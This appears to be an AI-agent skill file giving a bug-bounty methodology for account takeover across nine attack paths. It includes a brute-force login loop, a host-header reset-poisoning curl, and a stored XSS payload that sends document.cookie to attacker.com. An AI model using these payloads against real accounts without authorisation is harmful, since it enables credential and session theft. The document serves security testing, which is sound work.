---
name: hunt-ato
description: |
  Account Takeover hunting methodology. 9 distinct ATO paths with detection
  patterns: credential stuffing, password reset poisoning, OAuth account linkage,
  session hijacking, MFA bypass chains, CSRF-to-ATO, IDOR-to-ATO, SSO bypass,
  and cookie theft.
triggers:
  - hunt ato
  - account takeover
  - password reset
  - session hijacking
  - oauth account takeover
  - brute force login
  - authentication bypass
  - login bypass
category: security
---
# Account Takeover (ATO) Hunting Methodology

Adapted from Claude-BugHunter by ElementalSouls.

---

## Core Principle

> **"Account takeover is the highest-impact finding in bug bounty. Any chained finding that ends in 'I can log in as another user without their password' is critical."**

---

## 9 ATO Paths

### Path 1: Credential Stuffing / Brute Force

**Test:**
- Login endpoint without rate limiting
- Password reset OTP brute force
- API authentication bypass (no rate limit on auth endpoints)
- Multi-factor bypass when password is guessed

**Detection:**
```bash
# Test rate limiting — send 100 rapid login attempts
for i in {1..100}; do
  curl -X POST https://target.com/api/login \
    -d "username=victim@test.com&password=wrong$i"
done
# Check if any succeeded or if you get rate-limited
```

**Signal:** No CAPTCHA, no rate limiting, no account lockout after 5+ attempts.

### Path 2: Password Reset Poisoning

**Test:**
- Reset token in email → click → logged in without password
- Host header injection in reset email
- Token in URL can be intercepted or guessed
- Token reuse (same token for multiple resets)
- No expiry on reset token

**Chain:**
```
Host header injection → password reset link contains attacker domain
→ Victim clicks link → token sent to attacker → ATO
```

**Detection:**
```bash
# Test host header injection
curl -X POST https://target.com/api/forgot-password \
  -H "Host: attacker.com" \
  -d "email=victim@test.com"

# Check if reset email contains attacker.com in the link
```

### Path 3: OAuth Account Linkage

**Test:**
- Login with Google → link to existing account → capture auth code
- CSRF on OAuth `state` parameter
- OAuth `redirect_uri` open redirect
- Missing PKCE → auth code interception
- Login CSRF → attacker links their social account to victim's account

**Chain:**
```
Missing state parameter on OAuth → attacker crafts auth URL with their client_id
→ Victim logs in via OAuth → account linked to attacker
→ Attacker logs in as victim
```

### Path 4: Session Hijacking

**Test:**
- Stored XSS → steal session cookie
- Session in URL → share link leaks session
- Session fixation → attacker sets victim's session ID
- Session not rotated on login/privilege escalation
- HTTP-only cookies not set for session cookie

**OOB Confirmation:**
```
Stored XSS payload:
<script>document.location='https://attacker.com/steal?c='+document.cookie</script>
→ Confirm cookie received on your server
```

### Path 5: MFA Bypass Chains

**Test:**
1. OTP brute force (6-digit code, no rate limit → 1M combos)
2. Race condition on OTP verification
3. Recovery codes bypass MFA entirely
4. OAuth/SSO sign-in doesn't trigger MFA
5. Session reuse across MFA boundary
6. Login with password only (no MFA prompt)
7. Device trust bypass

**Chain:**
```
Weak password + missing MFA rate limit → brute OTP → ATO
```

### Path 6: CSRF → ATO

**Test:**
- Email change requires no password/current password
- No CSRF token on email/phone change
- Forgotten password flow has no anti-CSRF
- Account details change accepts GET requests

**Chain:**
```
CSRF on email change → attacker changes victim's email →
password reset sent to attacker's email → ATO
```

### Path 7: IDOR → ATO

**Test:**
- Update other user's password via API
- Modify other user's email → reset password
- Change other user's role/privileges
- Access password reset tokens belonging to other users

**Chain:**
```
IDOR on PUT /api/user/{id}/password → change victim's password → ATO
```

### Path 8: SSO / Federation Bypass

**Test:**
- SAML signature not validated → forge SAML response
- SSO login creates account automatically → attacker claims email
- SSO trusts external IdP → rogue IdP authenticates as victim
- JWT `sub` claim not validated → impersonate any user

**Chain:**
```
SAML XML signature wrapping → forge response for victim@test.com
→ Service accepts forged assertion → ATO
```

### Path 9: Cookie Theft (XSS → ATO)

**Test:**
- Session cookie without HttpOnly flag
- Any stored XSS on a page victim visits
- Blind XSS on admin panel
- XSS on subdomain with parent-domain cookie access

**Chain:**
```
Stored XSS in profile bio → admin reviews profile → cookie stolen
→ Session hijack to admin account → full admin access
```

---

## ATO Detection Checklist

For **each** authentication-related feature, test:

- [ ] **Login**: rate limiting, brute force, credential stuffing, default credentials
- [ ] **Password Reset**: token in email, token expiry, host header, email verification
- [ ] **OAuth/SSO**: state parameter, PKCE, redirect_uri validation, CSRF on linking
- [ ] **MFA**: OTP brute, recovery code bypass, factor downgrade, device trust
- [ ] **Session**: HttpOnly cookie, Secure flag, rotation on login, fixation
- [ ] **Profile Update**: CSRF on email/password change, current password required
- [ ] **API**: IDOR on user settings, password change via API, role escalation

---

## Severity Guide

| ATO Path | Severity | Notes |
|---|---|---|
| Any-user ATO with zero interaction | Critical | No click, no preconditions |
| ATO requiring victim click | High | Realistic phishing scenario |
| ATO requiring MFA compromise | High | Chain is complex but valid |
| ATO via CSRF on email change | High | Requires phishing but works |
| Self-ATO (own account) | Informational | Not a bug |
| ATO requiring compromised account | Medium | Chained finding |
